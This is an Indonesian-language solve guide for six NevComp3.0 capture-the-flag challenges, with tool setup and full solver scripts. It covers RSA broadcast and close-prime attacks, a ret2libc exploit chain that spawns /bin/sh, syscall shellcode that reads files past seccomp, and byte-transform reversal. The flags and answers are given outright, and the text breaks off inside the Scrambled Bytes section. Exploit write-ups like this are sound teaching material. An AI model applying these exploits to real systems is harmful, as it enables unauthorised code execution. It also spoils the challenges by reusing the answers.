# NevComp3.0 — Panduan Scan dan Solve CTF

## Peta hasil scanning

Folder kerja berisi **6 challenge**:

| Challenge | Kategori | File peserta (`dist`) | Inti kelemahan |
|---|---|---|---|
| Broken Broadcast | Crypto | `Crypto/Broken Broadcast/dist/chall.py` | RSA `e=11`, pesan sama dikirim ke banyak modulus |
| Too Close | Crypto | `Crypto/Too Close/dist/chall.py`, `out.txt` | Prime RSA terlalu dekat |
| Simple Login | Pwn | `Pwn/Simple Login/dist/chall` | `gets()` buffer overflow, ret2libc |
| Vault | Pwn | `Pwn/Vault/dist/chall.zip` | Shellcode RWX, syscall file masih diizinkan |
| Scrambled Bytes | RE | `Reverse/Scrambled Bytes/dist/chall` | Transformasi byte reversible |
| Trace Me If You Can | RE | `Reverse/Trace Me If You Can/dist/chall` | PRNG dan transformasi byte bisa dibalik |

Tidak ada challenge **Web** atau **Forensic**.

### `dist` vs `src`

- `dist` berisi file yang diberikan ke peserta. Buka `dist` pertama saat lomba.
- `src` berisi source pembuat, Dockerfile, solver, libc, dan kadang flag. File ini biasanya tidak diberikan saat lomba.
- `challenge.yaml` berisi metadata deployment. Pada folder latihan ini metadata memuat flag template, tetapi jangan mengandalkannya dalam lomba nyata.

Perintah awal umum:

```bash
find . -type f -printf '%p %s bytes\n'
file path/to/file
strings -n 6 path/to/file | less
```

Untuk ELF:

```bash
checksec --file=./chall
readelf -h ./chall
readelf -s ./chall | less
objdump -d -M intel ./chall | less
```

Arti mitigasi: canary mencegah banyak stack overflow; NX membuat stack tidak executable; PIE mengacak alamat code; RELRO melindungi GOT; stripped menghapus nama fungsi.

## 0.1 Setup Lab Pemula: Terminal dan Tools

Bagian ini penting jika belum terbiasa dengan command line. Semua perintah di bawah memakai **WSL/Linux**, bukan PowerShell biasa, kecuali jika diberi tanda PowerShell.

### Kenapa memakai WSL/Linux?

Challenge Pwn dan Reverse berbentuk binary Linux ELF. Windows tidak bisa menjalankan ELF secara langsung. WSL memberi terminal Linux di dalam Windows.

Buka WSL:

```powershell
wsl
```

Setelah prompt berubah menjadi mirip `user@computer:~$`, berarti sudah berada di Linux. Masuk ke folder challenge:

```bash
cd /mnt/c/laragon/www/NevComp3.0-main
pwd
ls -la
```

Arti command:

- `cd` = change directory, pindah folder.
- `pwd` = print working directory, menampilkan folder aktif.
- `ls` = melihat isi folder.
- `ls -la` = melihat semua file, termasuk file tersembunyi, dengan detail.
- `/mnt/c/` = drive `C:` Windows yang dipasang WSL.

Jika nama folder memiliki spasi, selalu gunakan tanda kutip:

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Pwn/Simple Login"
```

### Install tools di Kali/Ubuntu WSL

Jalankan satu kali:

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv file binutils gdb \
    unzip curl wget git gcc make checksec
```

Arti tools:

| Tool | Kegunaan |
|---|---|
| `file` | Mengenali format file, arsitektur, dan apakah binary stripped |
| `strings` | Mencari teks ASCII yang tertanam di binary |
| `checksec` | Melihat proteksi binary Pwn |
| `readelf` | Membaca header, section, symbol, dan segment ELF |
| `objdump` | Disassembly binary menjadi instruksi assembly |
| `gdb` | Debugger: menjalankan program dan melihat register/memory |
| `gcc` | Compiler C, berguna jika ingin membangun ulang source |
| `python3` | Menjalankan solver Crypto/RE |
| `pwntools` | Library Python untuk exploit, ROP, koneksi service |
| `Ghidra` | GUI reverse engineering; decompile binary ke pseudo-C |
| `Cutter`/`radare2` | Alternatif GUI/CLI untuk reverse engineering |
| `unzip` | Mengekstrak challenge archive |
| `socat`/`nc` | Menguji koneksi TCP challenge |

Beberapa distro tidak menyediakan `checksec` sebagai command langsung. Jika command tidak ditemukan, gunakan pwntools:

```bash
python3 -m pip install --user pwntools
python3 -c "from pwn import context; print('pwntools OK')"
```

Jika pip menolak install karena `externally-managed-environment`, buat virtual environment:

```bash
python3 -m venv ~/ctf-venv
source ~/ctf-venv/bin/activate
python -m pip install --upgrade pip
python -m pip install pwntools pycryptodome sympy gmpy2
```

Setiap kali membuka terminal baru:

```bash
source ~/ctf-venv/bin/activate
```

Tes semua tools:

```bash
python3 --version
python3 -c "import pwn; print('pwntools OK')"
python3 -c "from Crypto.Util.number import long_to_bytes; print('pycryptodome OK')"
file --version
objdump --version | head -1
readelf --version | head -1
gdb --version | head -1
```

### Cara membaca output `file`

Contoh:

```text
ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
```

Artinya:

- `ELF` = format executable Linux.
- `64-bit` = register/address 64-bit.
- `x86-64` = arsitektur CPU.
- `PIE` = alamat binary dapat berubah karena ASLR.
- `dynamically linked` = memakai library eksternal seperti libc.
- `stripped` = nama symbol/fungsi dibuang; reverse lebih sulit.

Contoh file script:

```text
Python script, ASCII text executable
```

Berarti file dapat dibaca dengan `cat`, `less`, atau editor teks. Tidak perlu Ghidra.

### Cara membaca output `strings`

```bash
strings -a -n 6 ./chall | less
```

- `-a` = scan seluruh file.
- `-n 6` = tampilkan string minimal 6 karakter.
- `less` = baca halaman demi halaman; tekan `q` untuk keluar.

Cari teks penting:

```bash
strings -a -n 5 ./chall | grep -Ei 'flag|password|wrong|correct|debug|/bin/sh'
```

`strings` bukan solver otomatis. Ia hanya memberi petunjuk, misalnya nama file, pesan error, key, atau string `/bin/sh`.

### Cara membaca output `checksec`

```bash
checksec --file=./chall
```

Fokus pada:

- `Canary found`: stack punya nilai penjaga. Overflow yang merusak canary biasanya crash.
- `No canary found`: overflow stack lebih mungkin.
- `NX enabled`: memory stack tidak boleh mengeksekusi code. Gunakan ROP/ret2libc.
- `NX disabled`: shellcode di stack mungkin dapat dijalankan.
- `PIE enabled`: alamat fungsi binary berubah. Cari leak atau gunakan offset.
- `No PIE`: alamat fungsi binary stabil, exploit lebih mudah.
- `Partial RELRO`: GOT sebagian masih dapat ditulis.
- `Full RELRO`: GOT read-only setelah resolver selesai.

### Cara menjalankan program dengan aman

Jangan langsung mengetik flag asli ke program yang belum dipahami. Mulai dari input sederhana:

```bash
printf 'test\n' | ./chall
```

Jika permission ditolak:

```bash
chmod +x ./chall
```

Jika ingin melihat exit code:

```bash
./chall
printf 'test\n'
echo $?
```

Exit code `0` biasanya sukses. Nilai lain menunjukkan error/crash.

### Ghidra untuk pemula

Ghidra cocok untuk binary Reverse ketika source C tidak diberikan.

1. Buka Ghidra.
2. Pilih `File > New Project > Non-Shared Project`.
3. Import file `dist/chall`.
4. Klik **Analyze** dengan opsi default.
5. Buka `Symbol Tree > Functions`.
6. Jika binary tidak stripped, mulai dari `main`.
7. Jika stripped, cari string di `Window > Defined Strings`.
8. Klik kanan string, pilih `References > Show References to`.
9. Ikuti fungsi yang memakai string tersebut.
10. Buka **Decompiler** untuk melihat pseudo-C.

Ghidra tidak selalu menghasilkan C sempurna. Anggap hasil decompiler sebagai petunjuk, lalu cocokkan dengan assembly.

### GDB untuk pemula

Command dasar:

```gdb
file ./chall
break main
run
info registers
x/20gx $rsp
x/s $rdi
disassemble main
continue
quit
```

Arti:

- `break main` memasang breakpoint di `main`.
- `run` menjalankan program.
- `info registers` menampilkan register.
- `x/20gx $rsp` melihat 20 nilai 8-byte dari stack pointer.
- `x/s $rdi` membaca alamat di register `RDI` sebagai string.
- `disassemble main` menampilkan assembly fungsi.
- `continue` melanjutkan eksekusi.
- `quit` keluar.

Untuk challenge anti-debug, jangan heran jika `gdb ./chall` langsung menghasilkan `Debugger Detected!`. Solve offline dengan meniru rumus checker.

---

### Broken Broadcast - Kategori: Crypto

**Flag:** `NevComp3.0{stop_shouting_the_same_secret_everywhere}`

#### 1. Pengenalan File (`src` vs `dist`)

`dist/chall.py` membuat RSA dengan `e=11`, prime baru, lalu mencetak `n`, `e`, dan `ct`. `src/chall.py` adalah source pembuat yang memuat flag asli. `src/solve.py`, Dockerfile, dan compose file adalah internal.

Saat lomba, buka `dist/chall.py` atau service lebih dulu. Jangan menganggap `src` tersedia.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Crypto/Broken Broadcast'
cat dist/chall.py
file dist/chall.py
grep -nE 'e|n|ct|pow|FLAG' dist/chall.py
```

Petunjuk utama: `e=11`, plaintext identik, dan setiap eksekusi membuat modulus baru. Dengan `e` kecil, kumpulkan 11 pasangan `(n,ct)` dari 11 koneksi.

**Tools yang dipakai:**

- `cat` untuk membaca script Python.
- `grep` untuk mencari variabel penting.
- Python `pow` untuk modular exponentiation.
- `pwntools.remote` untuk membuat koneksi berulang ke service.
- CRT dan integer root ditulis sendiri agar konsep terlihat jelas.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Crypto/Broken Broadcast"
pwd
ls -la dist src
file dist/chall.py
cat dist/chall.py
python3 dist/chall.py
```

`python3 dist/chall.py` hanya membuat **satu** sampel. Catat output:

```text
n = angka besar
e = 11
ct = angka besar
```

`n` adalah modulus publik RSA, `e` adalah exponent publik, dan `ct` adalah ciphertext. Menjalankan script 11 kali secara terpisah juga bisa menghasilkan 11 sampel file, tetapi solver `pwntools` lebih praktis jika challenge berjalan sebagai TCP service.

Jika service lokal sudah hidup, uji koneksi tanpa solver:

```bash
nc 127.0.0.1 1111
```

Ketik `Ctrl+C` untuk keluar. Jika muncul `Connection refused`, service belum berjalan; itu bukan error algoritma. Untuk challenge remote, gunakan host dan port dari penyelenggara.

Jika ingin membuat file sampel manual:

```bash
for i in $(seq 1 11); do python3 dist/chall.py > "sample-$i.txt"; done
head -3 sample-1.txt
```

Namun sampel manual ini hanya berguna jika solver diubah untuk membaca file. Solver di bawah memakai TCP.

#### 3. Konsep Dasar

RSA textbook menghitung `c = m^e mod n`. CRT menggabungkan 11 sisa ciphertext menjadi `m^11` asli bila semua modulus saling prima dan `m^11 < product(n)`. Akar pangkat 11 kemudian menghasilkan `m`.

Ini Håstad broadcast attack. RSA perlu padding aman seperti OAEP untuk mencegah pola pesan sama.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Hubungkan ke service 11 kali.
2. Parse `n` dan `ct`.
3. Pastikan modulus tidak duplikat dan saling prima.
4. Jalankan CRT.
5. Ambil integer 11th root.
6. Konversi integer ke bytes.

#### 5. Full Script Solver & Penjelasan Per Baris

```python
from math import gcd
from pwn import remote

E = 11                         # Exponent publik.
HOST, PORT = "127.0.0.1", 1111 # Ganti dengan host/port challenge.

# Jika service memakai format output berbeda, sesuaikan recvuntil di bawah.

def egcd(a, b):
    # Extended Euclid memberi gcd dan koefisien invers.
    if b == 0:
        return a, 1, 0
    g, x, y = egcd(b, a % b)
    return g, y, x - (a // b) * y

def inverse(a, modulus):
    # Invers modular hanya ada jika gcd = 1.
    g, x, _ = egcd(a, modulus)
    if g != 1:
        raise ValueError("modulus tidak saling prima")
    return x % modulus

def crt(moduli, residues):
    # CRT menghasilkan m^E dari banyak pasangan sisa.
    total = 1
    for n in moduli:
        total *= n
    result = 0
    for n, c in zip(moduli, residues):
        partial = total // n
        result += c * partial * inverse(partial, n)
    return result % total

def integer_root(value, exponent):
    # Binary search floor akar bulat.
    low, high = 0, 1
    while high ** exponent <= value:
        high *= 2
    while high - low > 1:
        middle = (low + high) // 2
        if middle ** exponent <= value:
            low = middle
        else:
            high = middle
    return low, low ** exponent == value

moduli, ciphertexts = [], []
while len(moduli) < E:
    io = remote(HOST, PORT)
    io.recvuntil(b"n = ")
    n = int(io.recvline())
    io.recvuntil(b"ct = ")
    c = int(io.recvline())
    io.close()
    if n not in moduli and all(gcd(n, old) == 1 for old in moduli):
        moduli.append(n)
        ciphertexts.append(c)

combined = crt(moduli, ciphertexts)
m, exact = integer_root(combined, E)
if not exact:
    raise ValueError("root tidak tepat; sampel atau asumsi salah")
raw = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(raw.decode())
```

`crt` menghapus modulus RSA. `integer_root` mengembalikan plaintext integer. Tidak perlu private key.

#### 6. Flag & Kesimpulan Belajar

```text
NevComp3.0{stop_shouting_the_same_secret_everywhere}
```

Pola: `e` kecil + pesan sama + banyak modulus = broadcast attack. Kumpulkan minimal `e` sampel, CRT, lalu akar bulat.

---

### Too Close - Kategori: Crypto

**Flag:** `NevComp3.0{a_little_too_close_for_comfort}`

#### 1. Pengenalan File (`src` vs `dist`)

Peserta mendapat `dist/chall.py` dan `dist/out.txt`. `out.txt` berisi `n`, `e`, `ct`. Source internal `src/chall.py` memperlihatkan pembuat memakai `q = p + 2`, lalu menaikkan `q` sedikit sampai prime.

Buka `dist/out.txt` dan generator dulu saat lomba. Solver di `src/` hanya referensi.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Crypto/Too Close'
cat dist/chall.py
cat dist/out.txt
```

Petunjuk utama:

```python
p = getPrime(1024)
q = p + 2
while not isPrime(q):
    q += 2
```

Prime RSA terlalu dekat. Coba Fermat factorization, bukan brute force faktor 1024-bit.

**Tools yang dipakai:**

- `cat` untuk membaca generator dan data publik.
- `file` untuk memastikan format file.
- Python `math.isqrt` untuk akar kuadrat integer.
- Python `pow(base, exponent, modulus)` untuk decrypt RSA.
- Tidak perlu Ghidra, pwntools, atau koneksi network.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Crypto/Too Close"
pwd
ls -la dist src
file dist/chall.py dist/out.txt
cat dist/chall.py
cat dist/out.txt
python3 dist/chall.py
```

`python3 dist/chall.py` membuat data baru sehingga hasilnya berbeda dari `dist/out.txt`. Untuk solve challenge yang disediakan, gunakan angka dari `dist/out.txt`, bukan output baru.

Cek ukuran bilangan:

```bash
python3 - <<'PY'
from pathlib import Path
for line in Path('dist/out.txt').read_text().splitlines():
    name, value = line.split(' = ')
    print(name, 'digit count =', len(value))
PY
```

Angka `n` sekitar 600 digit desimal berarti modulus besar. Jangan mencoba membagi `n` dengan semua angka dari 2 sampai `sqrt(n)`; itu akan sangat lambat. Petunjuk prime dekat membuat Fermat menjadi pilihan tepat.

#### 3. Konsep Dasar

Tulis `n = p*q = a²-b² = (a-b)(a+b)`. Jika `p` dan `q` dekat, `a = (p+q)/2` dekat dengan `sqrt(n)`. Mulai dari `ceil(sqrt(n))`; saat `a²-n` menjadi kuadrat sempurna, `p=a-b` dan `q=a+b`.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Parse `n`, `e`, `ct`.
2. Hitung `a=ceil(sqrt(n))`.
3. Ulangi sampai `a²-n=b²` sempurna.
4. Bentuk `p,q`.
5. Hitung `phi`, `d`, dan `m=ct^d mod n`.
6. Ubah `m` menjadi bytes.

Pada data ini `q-p=200`, dan faktor ditemukan pada langkah awal.

#### 5. Full Script Solver & Penjelasan Per Baris

```python
from math import isqrt

# Jalankan dari folder challenge: python3 solve_too_close.py

def egcd(a, b):
    if b == 0:
        return a, 1, 0
    g, x, y = egcd(b, a % b)
    return g, y, x - (a // b) * y

def inverse(a, modulus):
    g, x, _ = egcd(a, modulus)
    if g != 1:
        raise ValueError("tidak ada invers")
    return x % modulus

values = {}
for line in open("dist/out.txt", encoding="ascii"):
    name, value = line.split(" = ")
    values[name] = int(value)
n, e, ct = values["n"], values["e"], values["ct"]

a = isqrt(n)
if a * a < n:
    a += 1                         # ceil(sqrt(n))
while True:
    b_squared = a * a - n
    b = isqrt(b_squared)
    if b * b == b_squared:
        break
    a += 1

p, q = a - b, a + b
assert p * q == n
phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(ct, d, n)
raw = m.to_bytes((m.bit_length() + 7) // 8, "big")
print(raw.decode())
```

`pow(ct,d,n)` melakukan modular exponentiation efisien; jangan menghitung pangkat besar tanpa modulus.

#### 6. Flag & Kesimpulan Belajar

```text
NevComp3.0{a_little_too_close_for_comfort}
```

Pola: source yang membuat prime berdekatan langsung mengarah ke Fermat. Panjang RSA tidak menolong jika faktor memiliki jarak kecil.

---

### Simple Login - Kategori: Pwn

**Flag:** `NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}`

#### 1. Pengenalan File (`src` vs `dist`)

Peserta mendapat binary `Pwn/Simple Login/dist/chall`. `src/chall.c` berisi source, `src/solve.py` exploit referensi, `src/libc.so.6` dan loader adalah runtime internal, sedangkan `src/flag.txt` rahasia pembuat.

Saat lomba, buka `dist/chall` dulu. Jangan mengandalkan source atau `flag.txt`.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Pwn/Simple Login/dist'
file chall
checksec --file=chall
strings -n 6 chall | less
readelf -s chall | grep -E 'gets|puts|main'
```

Mitigasi terdeteksi: Partial RELRO, **No canary**, NX enabled, **No PIE**. Source menunjukkan `gets(password)` dengan buffer 64 byte. `gets` tidak membatasi panjang input, sehingga saved RIP dapat ditimpa. Gadget `pop rdi; ret` ditanam dalam binary.

**Tools yang dipakai:**

- `file`: memastikan binary Linux x86-64.
- `checksec`: menentukan strategi exploit dari proteksi.
- `strings`: mencari pesan dan kemungkinan nama fungsi/string.
- `readelf`/`objdump`: melihat symbol dan assembly jika perlu.
- `gdb`: mencari offset crash dan memeriksa stack.
- `pwntools`: membuat payload, mencari gadget ROP, leak address, dan berinteraksi dengan process/service.
- `libc.so.6`: menyediakan alamat relatif `puts`, `system`, dan `/bin/sh`.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Pwn/Simple Login/dist"
pwd
ls -lh
file chall
checksec --file=chall
strings -a -n 6 chall | grep -Ei 'username|password|welcome|puts|gets|flag'
readelf -s chall | grep -E ' main| puts| gets'
```

Output `No canary` berarti saved RIP dapat ditargetkan. Output `No PIE (0x400000)` berarti alamat gadget dalam binary stabil. Output `NX enabled` berarti jangan mengirim shellcode ke stack; gunakan ROP.

Cari gadget dengan Python:

```bash
python3 - <<'PY'
from pwn import *
elf = ELF('./chall', checksec=False)
rop = ROP(elf)
print('pop rdi; ret =', rop.find_gadget(['pop rdi', 'ret']))
print('ret =', rop.find_gadget(['ret']))
print('puts GOT =', hex(elf.got['puts']))
print('puts PLT =', hex(elf.plt['puts']))
print('main =', hex(elf.sym['main']))
PY
```

Jika ingin melihat overflow di GDB:

```bash
gdb -q ./chall
```

Di GDB:

```gdb
run
```

Ketik username, lalu password panjang. Program dapat crash saat `ret`. Untuk challenge ini solver referensi sudah memberikan offset `104`; pemula dapat memahami angka itu sebagai jumlah byte dari awal `password` sampai alamat return.

Jangan menjalankan exploit terhadap server publik tanpa izin. Gunakan binary lokal atau service CTF yang memang disediakan.

#### 3. Konsep Dasar

Stack berisi buffer, saved RBP, lalu saved RIP. Offset ke RIP adalah 104 byte. ROP pertama memanggil `puts(puts@got)` dan kembali ke `main`, sehingga alamat libc bocor. Hitung `libc_base = leak - libc.sym['puts']`. ROP kedua mengatur `RDI` ke `/bin/sh`, lalu memanggil `system`.

NX membuat shellcode stack tidak bisa jalan, jadi gunakan ret2libc. No PIE membuat gadget binary tetap di alamat 0x400000.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Jalankan `checksec`.
2. Temukan offset RIP; di challenge ini 104.
3. Cari `pop rdi; ret` dan `ret` dengan pwntools.
4. Leak `puts@got` melalui `puts@plt`.
5. Hitung base libc.
6. Kirim payload `system('/bin/sh')`.
7. Ketik `cat /home/ctf/flag.txt` pada container.

#### 5. Full Script Solver & Penjelasan Per Baris

```python
from pwn import *

# Jalankan dari folder yang berisi chall dan libc.so.6.
# Untuk service lomba, ganti process() di start() menjadi remote().
context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def start():
    # Untuk target remote: return remote("host", 1337)
    return process("./chall")

io = start()
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]
offset = 104

io.sendline(b"Gengg.")
io.sendline(flat([
    b"A" * offset,       # Lewati buffer sampai saved RIP.
    pop_rdi,
    elf.got["puts"],      # Argumen puts: alamat GOT.
    elf.plt["puts"],      # Leak alamat puts libc.
    elf.sym["main"],      # Kembali untuk payload kedua.
]))
io.recvuntil(b"Welcome Gengg. ")
leak = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = leak - libc.sym["puts"]

bin_sh = next(libc.search(b"/bin/sh\x00"))
io.sendline(b"Gengg.")
io.sendline(flat([
    b"A" * offset,
    pop_rdi,
    bin_sh,
    ret,                   # Alignment stack x86-64.
    libc.sym["system"],   # system("/bin/sh").
]))
io.interactive()
```

Jalankan di WSL/Linux dengan `python3-pwntools`, bukan PowerShell biasa. Binary workspace berhasil diuji lokal sampai tahap leak; instance container tidak dijalankan karena Docker daemon lokal tidak aktif.

#### 6. Flag & Kesimpulan Belajar

```text
NevComp3.0{basic_ret2libc_ggwp...sengaja_gk_kasih_libc_biar_cari_libc_nya_sendiri_fdec58ec61d}
```

Pola: `gets` + no canary adalah overflow; leak libc lalu ret2libc. Periksa offset, libc version, dan stack alignment.

---

### Vault - Kategori: Pwn

**Flag:** `NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}`

#### 1. Pengenalan File (`src` vs `dist`)

Peserta mendapat `Pwn/Vault/dist/chall.zip`. Isinya `chall`, `docker-compose.yml`, dan `Dockerfile`. `src/chall.c` dan `src/solve.py` adalah internal pembuat.

Ekstrak ZIP dan buka binary terlebih dahulu. Dockerfile peserta menunjukkan flag dibuat dengan nama random, tetapi nilainya tidak boleh diasumsikan diketahui dalam lomba.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Pwn/Vault'
unzip -l dist/chall.zip
unzip dist/chall.zip -d work
cd work
file chall
checksec --file=chall
strings -n 6 chall | less
```

Binary memakai Full RELRO, canary, NX, PIE, dan FORTIFY. Namun source/alur utama membuat mapping `PROT_READ | PROT_WRITE | PROT_EXEC`, membaca 0x1000 byte dari stdin, lalu menjalankannya. Ini vulnerability langsung: arbitrary shellcode.

Seccomp hanya mengizinkan `open`, `openat`, `read`, `write`, `exit`, `exit_group`, dan `getdents64`. Semua syscall yang dibutuhkan untuk membaca flag masih tersedia.

**Tools yang dipakai:**

- `unzip`: membuka archive peserta.
- `file` dan `checksec`: membaca format dan mitigasi binary.
- `strings`: mencari prompt, nama file, dan syscall-related string.
- `pwntools`: assembler shellcode, `shellcraft`, koneksi TCP.
- `getdents64`: syscall untuk membaca daftar nama file.
- `read` dan `write`: syscall untuk mengambil dan menampilkan isi flag.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Pwn/Vault"
unzip -l dist/chall.zip
mkdir -p work
unzip -o dist/chall.zip -d work
cd work
file chall
checksec --file=chall
strings -a -n 6 chall | grep -Ei 'payload|flag|seccomp|mmap|read|write'
```

`unzip -l` hanya melihat isi archive tanpa mengekstrak. `unzip -o` mengekstrak dan menimpa file lama jika ada. `mkdir -p work` membuat folder tanpa error jika folder sudah ada.

Jika ingin melihat shellcode sebelum mengirimnya:

```bash
python3 - <<'PY'
from pwn import *
context.arch = 'amd64'
code = shellcraft.open('.', 0)
code += shellcraft.getdents64('rax', 'rsp', 0x1000)
code += shellcraft.write(1, 'rsp', 'rax')
print(code)
print(disasm(asm(code)))
PY
```

Jika muncul `NameError: shellcraft`, pwntools belum aktif. Jalankan `source ~/ctf-venv/bin/activate` atau install pwntools.

#### 3. Konsep Dasar

Shellcode adalah opcode syscall kecil. Tidak perlu spawn shell. Enumerasi direktori dengan `getdents64`, cari `flag-*.txt`, lalu buka dan baca file memakai `open/read/write`. Nama flag acak membuat enumeration lebih baik daripada hard-code.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Ekstrak ZIP dan cek mitigasi.
2. Kenali mapping RWX dan eksekusi input.
3. Kirim shellcode `open('.')`, `getdents64`, `write` untuk daftar file.
4. Parse `linux_dirent64`; `d_reclen` offset 16, nama offset 19.
5. Cari nama `flag-*.txt`.
6. Kirim shellcode kedua: `open(name)`, `read`, `write`.

Docker daemon lokal mati pada saat analisis, jadi service Vault tidak dapat diuji end-to-end. Solver berikut lengkap untuk instance aktif.

#### 5. Full Script Solver & Penjelasan Per Baris

```python
from pwn import *

# Jalankan setelah service Vault aktif. Ganti host/port bila remote.
HOST, PORT = "127.0.0.1", 1338
context.arch = "amd64"

def connect():
    return remote(HOST, PORT)       # Local test: process("./chall")

def list_files():
    io = connect()
    sc = shellcraft.open(".", 0)
    sc += shellcraft.getdents64("rax", "rsp", 0x1000)
    sc += shellcraft.write(1, "rsp", "rax")
    io.send(asm(sc))
    data = io.recvall(timeout=2)
    io.close()
    return data

def parse_flag_name(data):
    offset = 0
    while offset + 19 <= len(data):
        reclen = u16(data[offset + 16:offset + 18])
        if reclen == 0:
            break
        end = data.find(b"\x00", offset + 19, offset + reclen)
        if end == -1:
            end = offset + reclen
        name = data[offset + 19:end]
        if name.startswith(b"flag-") and name.endswith(b".txt"):
            return name.decode()
        offset += reclen
    raise RuntimeError("flag file tidak ditemukan")

def read_flag(name):
    io = connect()
    sc = shellcraft.open(name, 0)
    sc += shellcraft.read("rax", "rsp", 0x100)
    sc += shellcraft.write(1, "rsp", 0x100)
    io.send(asm(sc))
    result = io.recvall(timeout=2)
    io.close()
    return result

name = parse_flag_name(list_files())
print(f"flag file: {name}")
print(read_flag(name).decode(errors="replace"))
```

Komentar inti: `rax` menampung file descriptor hasil `open`; `getdents64` mengisi buffer; return value `rax` menjadi jumlah byte yang dikirim; shellcode kedua memakai fd hasil open untuk read.

#### 6. Flag & Kesimpulan Belajar

```text
NevComp3.0{0gw_&_0rw_sh3llc0d3_e3sy_r1ght?_099f82d7d4}
```

Pola: RWX input langsung berarti shellcode, bahkan ketika semua mitigasi binary aktif. Seccomp bukan otomatis aman; periksa syscall yang masih boleh.

---

### Scrambled Bytes - Kategori: RE

**Flag:** `NevComp3.0{shuffl1ng_n1bbl3s_4nd_r0ll1ng_b1ts_l1k3_4_pr0f3ss10n4l_ch3f}`

#### 1. Pengenalan File (`src` vs `dist`)

Peserta mendapat `Reverse/Scrambled Bytes/dist/chall`, ELF stripped. `src/chall.c` adalah source checker, `src/enc.py` encoder, dan `src/solve.py` inverse solver. Saat lomba gunakan `dist/chall`, bukan source.

#### 2. Cara Analisis Awal (Reconnaissance)

```bash
cd 'Reverse/Scrambled Bytes'
file dist/chall
strings -n 6 dist/chall
checksec --file=dist/chall
```

`strings` memperlihatkan potongan key `4_l1ttl3...h1ft1ng`, pesan error, dan pesan sukses. Di Ghidra cari array ciphertext panjang 71 dan loop byte checker.

**Tools yang dipakai:**

- `file`: identifikasi ELF dan arsitektur.
- `strings`: cari key, prompt, dan pesan sukses.
- `checksec`: lihat proteksi; exploit tidak perlu memory corruption.
- Ghidra/Cutter: melihat loop dan array byte ketika source tidak ada.
- Python: menjalankan inverse transform.

**Command pengecekan dari awal:**

```bash
cd "/mnt/c/laragon/www/NevComp3.0-main/Reverse/Scrambled Bytes"
file dist/chall
checksec --file=dist/chall
strings -a -n 6 dist/chall | less
printf 'test\n' | ./dist/chall
```

Program akan menolak input karena panjangnya salah. Itu tetap berguna: kita tahu binary menerima string dan memeriksa panjang.

Cari teks sukses secara langsung:

```bash
strings -a dist/chall | grep -F 'You Win'
```

Cari byte array/assembly:

```bash
objdump -d -M intel dist/chall | less
readelf -x .rodata dist/chall | less
```

`objdump` menampilkan instruksi; `readelf -x .rodata` menampilkan data konstan. Jika array sulit dibaca, buka binary di Ghidra dan cari `You Win!` melalui Defined Strings, lalu ikuti reference menuju fungsi checker.

#### 3. Konsep Dasar

Encoder: XOR key, tambah indeks, swap nibble, ROR 5. Semua reversible. Inverse harus dijalankan dari langkah terakhir ke awal: ROL 5, swap nibble, kurangi indeks, XOR key.

#### 4. Langkah-demi-Langkah Penyelesaian (Step-by-Step Tutorial)

1. Ekstrak array byte dari binary/Ghidra.
2. Ambil key dari strings atau disassembly.
3. Inverse ROR dengan ROL.
4. Swap nibble.
5. Kurangi indeks modulo 256.
6. XOR key berulang.
7. Test flag ke binary.

```bash
printf '%s\n' 'NevComp3.0{shuffl1ng_n1bbl3s_4nd_r0ll1ng_b1ts_l1k3_4_pr0f3ss10n4l_ch3f}' | ./dist/chall
```

#### 5. Full Script Solver & Penjelasan Per Baris

```python
# Simpan script ini sebagai solve_scrambled.py, lalu jalankan:
# python3 solve_scrambled.py
ct = [
0x3D,0x9D,0x0E,0xBA,0x8F,0x0F,0x11,0x83,0xBC,0xAD,0x2A,0x09,
0xA1,0x29,0x07,0x24,0x12,0x09,0x17,0xA5,0xBF,0x8A,0xB5,0x2A,
0x37,0x26,0x2F,0x1B,0xC5,0xBA,0xBD,0x2D,0xA9,0xB1,0x33,0x2B,
0x40,0x3E,0xAB,0x9D,0xAF,0x3E,0xC0,0x95,0x37,0x2F,0x9C,0x1A,
0x32,0x48,0x50,0xB9,0xAF,0xA8,0xBB,0x53,0x1E,0x9D,0xA0,0xB3,
0x9E,0xC9,0xB7,0xC5,0x4E,0x37,0x3F,0xCF,0xD0,0xA3,0x34]
key = b"4_l1ttl3_b1t_0f_x0r_4nd_4_wh0l3_l0t_0f_sh1ft1ng"

def rol(value, amount):
    # Rotasi 8-bit; mask membuang bit di luar byte.
    return ((value << amount) | (value >> (8 - amount))) & 0xff

def swap_nibble(value):
    # Operasi ini inverse dirinya sendiri.
    return ((value >> 4) | (value << 4)) & 0xff

plain = bytearray()
for i, encrypted in enumerate(ct):
    value = rol(encrypted, 5)       # inverse ROR(5)
    value = swap_nibble(value)
    value = (value - i) & 0xff      # inverse +i
    value ^= key[i % len(key)]      # inverse XOR
    plain.append(value)
print(plain.decode())
```

#### 6. Flag & Kesimpulan Belajar

```text
